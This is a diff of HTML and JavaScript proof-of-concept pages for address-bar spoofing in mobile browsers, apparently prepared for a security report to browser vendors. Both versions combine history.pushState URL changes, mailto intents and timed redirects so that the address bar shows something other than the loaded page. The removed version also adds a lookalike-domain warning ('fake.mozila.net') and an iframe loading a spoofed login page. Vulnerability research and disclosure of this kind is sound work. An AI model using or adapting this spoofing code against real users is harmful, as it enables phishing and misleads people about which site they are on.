@@ -1,79 +1,35 @@
-<!DOCTYPE html>
-<html>
-<body>
-
-<input type="button" value="Click Call Center (Mailto)"
-onclick="
-setTimeout(function() {
-  location.href =
-  'mailto:    mozila.org says:               Firefox Down Go To fake.mozila.net' +
-  '?subject=POC%20Chrome%20Android%20UI%20Intent' +
-  '&body=Hello%20Chromium%20Security%20Team,%0A%0AThis%20email%20is%20opened%20via%20a%20mailto%20intent%20triggered%20from%20Chrome.%0A%0ARedirect%20happens%20after%20intent%20trigger.%0A%0ARegards,%0AQadhafy';
-}, 800);
-
-setTimeout(function() {
-  location.href = 'https://www.mozilla.org:8080/en-US/security/';
-}, 1600);
-">
-
-</body>
-</html>
-
 <!doctype html>
-<html lang="en">
+<html>
 <head>
-<meta charset="utf-8">
-<title>Firefox iOS Navigation Race PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, system-ui;
-  background: #f5f5f7;
-}
-iframe {
-  width: 100%;
-  height: 220px;
-  border: 1px solid #ddd;
-  border-radius: 12px;
-  margin-top: 16px;
-}
-.notice {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #b00020;
-  text-align: center;
-}
-</style>
+<title>iOS External Intent Navigation State PoC</title>
 </head>
 <body>
 
-<!-- iframe muncul otomatis -->
-<iframe
-  id="childFrame"
-  src="https://cnfdnfial-ops.github.io/spoof/login.html"
-  sandbox="allow-scripts allow-forms allow-same-origin">
-</iframe>
-
-<div class="notice">
-  Firefox iOS only — observe address bar & navigation race
-</div>
+<button id="test">Trigger mailto intent</button>
 
 <script>
-/* Step 1: URL manipulation, happens immediately */
-history.pushState({}, '', '/trusted');
+document.getElementById('test').onclick = () => {
 
-/* Step 2: Navigation race, fires after page show */
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://instagram.com:9090';
-      }, 80); // race timing
-    });
-  });
-});
+  // Step 1: change visible URL
+  history.pushState({}, '', '/expected-path');
+
+  // Step 2: trigger external intent
+  setTimeout(() => {
+    location.href = 'mailto:test@example.com';
+  }, 300);
+
+  // Step 3: delayed navigation after intent
+  setTimeout(() => {
+    location.href = 'https://meta.com:9090';
+  }, 1200);
+};
 </script>
+
+<p>
+Observe whether the address bar always reflects the active document
+after returning from the mail app.
+</p>
 
 </body>
 </html>
